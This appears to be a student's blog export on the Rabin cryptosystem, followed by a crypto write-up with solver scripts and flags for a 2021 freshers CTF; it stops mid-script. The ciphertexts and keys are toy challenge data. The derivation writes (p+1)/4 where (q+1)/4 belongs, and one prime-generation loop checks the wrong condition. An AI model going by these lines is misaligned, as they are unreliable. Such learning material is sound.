<h2 id="二次剩余定理"><a href="#二次剩余定理" class="headerlink" title="二次剩余定理"></a>二次剩余定理</h2><p>在题目中学习过</p>
<ul>
<li>当存在某个X，$X^2\equiv a\ (mod\ p)$成立，称a是模p的二次剩余，记作$a\in QR$</li>
<li>当对任意的X，$X^2\equiv a\ (mod\ p)$不成立，称a是模p的二次非剩余，记作$a\in NR$</li>
</ul>
<h3 id="雅可比符号"><a href="#雅可比符号" class="headerlink" title="雅可比符号"></a>雅可比符号</h3><p>注意，p是奇质数<br>$$<br>(\frac{a}{p})=\begin{cases}<br> 1 ,&amp;a\in QR \\<br> -1 &amp;a\in NR<br> \end{cases}<br>$$<br>有性质：<br>$$<br>(\frac{a}{p})\cdot(\frac{b}{p})=(\frac{ab}{p})<br>$$</p>
<h2 id="欧拉准则"><a href="#欧拉准则" class="headerlink" title="欧拉准则"></a>欧拉准则</h2><p>$$<br>a^{\frac{p-1}{2}}\equiv (\frac{a}{p})\ mod\ p<br>$$</p>
<p>师傅的博客上有证明，我就不抄了</p>
<p>下面开始推导Rabin</p>
<h2 id="Rabin攻击"><a href="#Rabin攻击" class="headerlink" title="Rabin攻击"></a>Rabin攻击</h2><p>在RSA中已知（p,q,n,c,e=2），且$p\equiv q\equiv 3(mod\ 4)$（后面这个条件必须满足，不然就是另外一种做法了）</p>
<p>由之前写过无数的性质可知，要求$c\equiv m^2(mod\ n)$，相当于求$c\equiv m^2(mod\ p)$</p>
<p>则c是模p的二次剩余，得<br>$$<br>c^{\frac{p-1}{2}}\equiv (\frac{c}{p})\ mod\ p<br>$$<br>又$(\frac{c}{p})=1$，得<br>$$<br>c^{\frac{p-1}{2}}\equiv 1\ (mod\ p)<br>$$<br>代入得$c\equiv m^2(mod\ p)$，得<br>$$<br>m^2\equiv c\cdot c^\frac{p-1}{2}\equiv c^\frac{p+1}{2}(mod\ p)<br>$$</p>
<p>然后直接开方，得<br>$$<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p)<br>$$<br>$$<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p<br>$$</p>
<hr>
<p>这个开方怎么来的呢，聂嘿，之前看过求<strong>平方根论文</strong>的时候也看到过</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210901103319470.png" alt="image-20210901103319470"></p>
<p>反正就是条结论，开方在模运算下也是成立的，我们这里不过是利用模的性质，加了一个模数依旧是成立的</p>
<hr>
<p>同理，在$c\equiv m^2(mod\ q)$下有<br>$$<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q)<br>$$<br>$$<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>$$<br>综上，<br>$$<br>\begin{cases}<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p) &amp; \\<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p &amp; \\<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q) &amp; \\<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>\end{cases}<br>$$<br><em>显然，因为开根之后又转成正数，这里就假设$c^\frac{p+1}{4}$要么等于它本身，要么等于$(q-c^\frac{p+1}{4})$吧，其中的一些细节暂时没有完全悟。反正一般运算意义下，开出来就两种结果嘛</em></p>
<p>这个时候是要解4个同余方程组，用到我们的老朋友中国剩余定理，分别是<br>$$<br>\begin{align}<br>\begin{cases}<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p)\\<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q)<br>\end{cases}<br>\qquad<br>\begin{cases}<br>m_1\equiv c^\frac{p+1}{4}\ (mod\ p)\\<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>\end{cases}<br>\\<br>\begin{cases}<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p\\<br>m_3\equiv c^\frac{p+1}{4}\ (mod\ q)<br>\end{cases}<br>\begin{cases}<br>m_2\equiv (p-c^\frac{p+1}{4})\ mod\ p\\<br>m_4\equiv (q-c^\frac{p+1}{4})\ mod\ q<br>\end{cases}<br>\end{align}<br>$$</p>
<hr>
<p>求解的过程就不再赘述，这里直接记公式</p>
<p>对于同余方程组$\begin{cases}<br>x\equiv a_1\ (mod\ m_1)\\<br>x\equiv a_2\ (mod\ m_2)\\<br>\quad \vdots\\<br>x\equiv a_n\ (mod\ m_n)<br>\end{cases}$</p>
<p>$$<br>x=\sum\limits_{i=1}^na_i\frac{M}{m_i}[(\frac{M}{m_i})^{-1}]_{m_i}\ mod\ M<br>$$</p>
<p>其中$M=\prod\limits_{i=1}^{n}m_i$</p>
<hr>
<p>所以我们看了和la佬博客上那样的脚本，懒狗不想复现</p>
<h2 id="Rabin攻击脚本范例"><a href="#Rabin攻击脚本范例" class="headerlink" title="Rabin攻击脚本范例"></a>Rabin攻击脚本范例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> p % <span class="number">4</span> != <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> != <span class="number">3</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;Rabin_is_awersome&#125;&#x27;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">inv_p = invert(p, q)</span><br><span class="line">inv_q = invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p+<span class="number">1</span>)//<span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q+<span class="number">1</span>)//<span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">a = (inv_p*p*mq+inv_q*q*mp) % n</span><br><span class="line">b = n-a</span><br><span class="line">c = (inv_p*p*mq-inv_q*q*mp) % n</span><br><span class="line">d = n-c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(d))</span><br></pre></td></tr></table></figure>

<h2 id="Square-roots-modulo-a-prime"><a href="#Square-roots-modulo-a-prime" class="headerlink" title="Square roots modulo a prime"></a>Square roots modulo a prime</h2><p>那么问题来了，为什么一定要满足$p\equiv q\equiv 3(mod\ 4)$呢？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210901113636410.png" alt="image-20210901113636410"></p>
<p>可以看到主要是这个$u_0$在作祟，最后一句没有看懂</p>
<p>那我们应该怎么办呢？</p>
<p>论文还是看不懂啊，勉强看到三分之一，还是最简单的部分，梁子先结下了，后续补充</p>
]]></content>
      <tags>
        <tag>Rabin攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>Blue-Whale2021 Freshers &amp; 2021第六届中国海洋大学信息安全竞赛Crypto方向部分WP</title>
    <url>/posts/ea88a88e/</url>
    <content><![CDATA[<p>20210903</p>
<p>芜湖，不是吧，不会有人鸽了两三个月才来复现结果误闯人家新生赛了吧</p>
<p>yyd萌新</p>
<span id="more"></span>

<h1 id="Blue-Whale2021-Freshers"><a href="#Blue-Whale2021-Freshers" class="headerlink" title="Blue-Whale2021 Freshers"></a>Blue-Whale2021 Freshers</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><blockquote>
<p>aW9kantaaG9mcnBoX3dyX0Zsc2todVZzZGZoIX0=</p>
</blockquote>
<p>base64$\rightarrow$Caesar 3</p>
<blockquote>
<p>flag{Welcome_to_CipherSpace!}</p>
</blockquote>
<h2 id="baby-OTP"><a href="#baby-OTP" class="headerlink" title="baby_OTP"></a>baby_OTP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;flag&#123;***********&#125;&#x27;</span>.strip(<span class="string">&#x27;flag&#123;&#x27;</span>).strip(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">mask = <span class="string">&#x27;It_is_Mask!&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">ord</span>(mask[i])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(cipher.encode())</span><br><span class="line"><span class="comment"># b&#x27;1;-6B,\x12R\x12\x18X&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{xOr_1s_3asy}</p>
</blockquote>
<h2 id="baby-exGCD"><a href="#baby-exGCD" class="headerlink" title="baby_exGCD"></a>baby_exGCD</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = <span class="number">9250064974587738262998767</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> p &gt; flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, p):</span><br><span class="line">    <span class="keyword">if</span> (i * flag - <span class="number">1</span>) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment"># 5141371231815721033613206</span></span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{inverse_}</p>
</blockquote>
<h2 id="baby-quadratic-residue"><a href="#baby-quadratic-residue" class="headerlink" title="baby_quadratic-residue"></a>baby_quadratic-residue</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;****&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = <span class="number">10</span>**<span class="number">11</span> + <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> flag &lt; p</span><br><span class="line"><span class="keyword">assert</span> flag ** <span class="number">2</span> % p == <span class="number">45738244299</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">10</span>**<span class="number">11</span> + <span class="number">3</span></span><br><span class="line">c = <span class="number">45738244299</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(p-<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{ea5y}</p>
</blockquote>
<h2 id="baby-proof-of-work"><a href="#baby-proof-of-work" class="headerlink" title="baby_proof_of_work"></a>baby_proof_of_work</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid4()) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> md5(flag.encode()).hexdigest() == <span class="string">&#x27;02195c68e0af460e431d8076aeda74d2&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[:-<span class="number">6</span>] == <span class="string">&#x27;flag&#123;ba9951a2-c233-4555-b703-1337cdc&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>UUID</strong>全称Universally Unique Identifier，通用唯一识别码，有点hash函数那味</p>
<p>16字节128位长的数字，通常以36字节的字符串表示，示例如下：</p>
<blockquote>
<p>3F2504E0-4F89-11D3-9A0C-0305E82C3301</p>
</blockquote>
<p>其中的字母是16进制表示，大小写无关</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> hexdigits</span><br><span class="line">space = hexdigits[:-<span class="number">6</span>]+<span class="string">&#x27;-&#x27;</span></span><br><span class="line">head = <span class="string">&#x27;flag&#123;ba9951a2-c233-4555-b703-1337cdc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">5</span>):</span><br><span class="line">    tail = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    flag = head + tail + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> md5(flag.encode()).hexdigest() == <span class="string">&#x27;02195c68e0af460e431d8076aeda74d2&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{ba9951a2-c233-4555-b703-1337cdcf4e3d}</p>
</blockquote>
<h2 id="baby-stream"><a href="#baby-stream" class="headerlink" title="baby_stream"></a>baby_stream</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;flag&#123;************************************&#125;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;******&#x27;</span></span><br><span class="line">cipher_set = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    cipher_set.append(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(cipher_set)</span><br><span class="line"><span class="comment"># [39, 43, 14, 46, 61, 28, 53, 24, 6, 58, 25, 19, 45, 38, 8, 22, 48, 16, 51, 62, 48, 44, 39, 6, 56, 53, 6, 46, 46, 1, 30, 62, 0, 60, 25, 30, 47, 40, 24, 104, 103, 8]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key</span></span><br><span class="line">cipher_set = [<span class="number">39</span>, <span class="number">43</span>, <span class="number">14</span>, <span class="number">46</span>, <span class="number">61</span>, <span class="number">28</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">58</span>, <span class="number">25</span>, <span class="number">19</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">6</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">46</span>, <span class="number">1</span>, <span class="number">30</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">47</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">8</span>]</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">key_parts = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    key_parts += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ cipher_set[i])</span><br><span class="line"><span class="comment"># print(key_parts)</span></span><br><span class="line">key = key_parts + <span class="string">&#x27;u&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_set)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(cipher_set[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{it_is_flag_very_easyright_you_know!!}</p>
</blockquote>
<h2 id="baby-gcd"><a href="#baby-gcd" class="headerlink" title="baby_gcd"></a>baby_gcd</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">data = bytes_to_long(flag[:<span class="number">5</span>])</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> flag &lt; n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(flag, e, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(data, p, n))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">13363911977381658054715749670898309746795378579901910744548891514119930365598763675900066558885526891111578153852505468781338322217670232547796382694454636854667270681576447072504446292150761913091590029636528472343128844309564616107199650709984359476698570483265981944043392159470470399285710046127749035432951653658588305611925416558985714889031024015889163354845747839686029526924544667996738073746867634061472313832146768108912385319342837354867508476685733543811014072221007141421012887749322127577045821626420889053517061583804135616739747129097247525956401277280445776859357071596335365635129076760168060966607</span></span><br><span class="line"><span class="string">10223697039967223267682181717488147275927367118413751107492765199808800173812525650250727485499667865861401513584367265156007990663044846919938201443790340452739587600478171647549035134701499317817566764471386396555838202312403465048654949983406474954598930748110503439437344393592595276155454781057276134145504380796903813247840224774545523607884159231845974898250966348829961146367007792068641912245512595560267823445320076403263562739363031632062342189801065044810262234549063628866927777175935167665086806182399437659557762115546086926046162171444133449925064332483160873278631920623056454541931283939092643363769</span></span><br><span class="line"><span class="string">8407634300955121132761790421404876464439171066953178241717181127133987272675024893882593118056392128685766053032230696604294564590205211272173466649761038412652836039898073070956658795752143907494078331602633733508202164910668310281736798447342720590176784043217138366486935759740252492090711972604375828430662071251842986961821739442853955099030914125069036528452384768331862222815666911989108515279529962229787757202741446628933696420814510070543569524978792494846011056162739011324784470527582059752893749932914976314325653212342060502072125738929300327802791282926291615350754819628989468488062512660927247417470</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>小费马忘了，多亏尚师傅提醒，白白耽搁好多时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> gcd, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">13363911977381658054715749670898309746795378579901910744548891514119930365598763675900066558885526891111578153852505468781338322217670232547796382694454636854667270681576447072504446292150761913091590029636528472343128844309564616107199650709984359476698570483265981944043392159470470399285710046127749035432951653658588305611925416558985714889031024015889163354845747839686029526924544667996738073746867634061472313832146768108912385319342837354867508476685733543811014072221007141421012887749322127577045821626420889053517061583804135616739747129097247525956401277280445776859357071596335365635129076760168060966607</span></span><br><span class="line">c = <span class="number">10223697039967223267682181717488147275927367118413751107492765199808800173812525650250727485499667865861401513584367265156007990663044846919938201443790340452739587600478171647549035134701499317817566764471386396555838202312403465048654949983406474954598930748110503439437344393592595276155454781057276134145504380796903813247840224774545523607884159231845974898250966348829961146367007792068641912245512595560267823445320076403263562739363031632062342189801065044810262234549063628866927777175935167665086806182399437659557762115546086926046162171444133449925064332483160873278631920623056454541931283939092643363769</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">_c = <span class="number">8407634300955121132761790421404876464439171066953178241717181127133987272675024893882593118056392128685766053032230696604294564590205211272173466649761038412652836039898073070956658795752143907494078331602633733508202164910668310281736798447342720590176784043217138366486935759740252492090711972604375828430662071251842986961821739442853955099030914125069036528452384768331862222815666911989108515279529962229787757202741446628933696420814510070543569524978792494846011056162739011324784470527582059752893749932914976314325653212342060502072125738929300327802791282926291615350754819628989468488062512660927247417470</span></span><br><span class="line">data = bytes_to_long(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">p = gcd(_c-data, n)</span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<p>sage是我自己上密码学课自己写的库，想要实现一些sage里常用的函数    </p>
<blockquote>
<p>flag{212333333333333333333333333333333333333333333333333333333333}</p>
</blockquote>
<p>不过话说离散对数在$\mathbb{Z}^*_n$下简单是真的吗</p>
<h2 id="baby-RSA"><a href="#baby-RSA" class="headerlink" title="baby_RSA"></a>baby_RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag <span class="comment"># it means we hide the flag</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">textbookRSA</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = q</span><br><span class="line">        self.N = self.p * self.q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = invert(self.e, (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> m &lt; self.N</span><br><span class="line">        <span class="keyword">return</span> powmod(m, self.e, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">return</span> powmod(c, self.d, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vulnerability</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (self.p, self.q)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">enc = textbookRSA(getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>))</span><br><span class="line">c = enc.encrypt(bytes_to_long(flag))</span><br><span class="line">vul = enc.vulnerability()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(vul)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">64701533343688372690654293712295773404129813784694237799153926736962621435068947287072687977347837010274295586096313263626594906283456719476000887723325924200788009114768670335038095853813713911223601130462041497767344698895750519413521122224460972816020538747290579261708064784859421449573347263967997160490</span></span><br><span class="line"><span class="string">(9830899743055626691883675211456964737373662213776941723212592815656583592986430578241161039226354632749313979784000329125662593896949062022073761989419743, 11413016938938274789177683025211095871490834309326773658937859388628168661305423686103065519733651943178907824777739859479458155320334969216051745769010187)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{welcome_to_crypto}</p>
</blockquote>
<h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b, c</span>):</span></span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = bytes_to_long(flag)</span><br><span class="line">        self.state = self.seed</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstate</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.state = (a * self.state + b) % c</span><br><span class="line">            <span class="keyword">yield</span> self.state</span><br><span class="line"></span><br><span class="line">a, b, c = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">prng = LCG(a, b, c)</span><br><span class="line">random_states = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    random_states.append(<span class="built_in">next</span>(prng.getstate()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random_states[-<span class="number">6</span>:])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[36525894934655222529534846431164486292811941872906741964139901975056461298468, 44760375502060853569502415785606266854123925363856190745249656424194532471837, 99435840430130187938928057751136501366281085823686937625866664159577574922185, 32218838886452625692584366771934359409743014626478611858398172896703555179084, 75894967689014169953442519719124136776429102657940075770201298059192401503113, 59195822914392909511892901455781443859673595142363513265120745050537984795930]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>小小LCG，就是同余式简单移位和变化；这里只知道最后6个状态，可以推出<strong>模数</strong>，然后推出<strong>乘数</strong>和<strong>增量</strong></p>
<p>抄个la佬的脚本，抄个<a href="https://zeroyu.xyz/2018/11/02/Cracking-LCG/">大佬的博客</a>，方便日后行动</p>
<p>稍作修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span>(<span class="params">states, m, a</span>):</span></span><br><span class="line">    b = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * a) % m</span><br><span class="line">    <span class="keyword">return</span> m, a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span>(<span class="params">states, m</span>):</span></span><br><span class="line">    a = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], m) % m</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, m, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 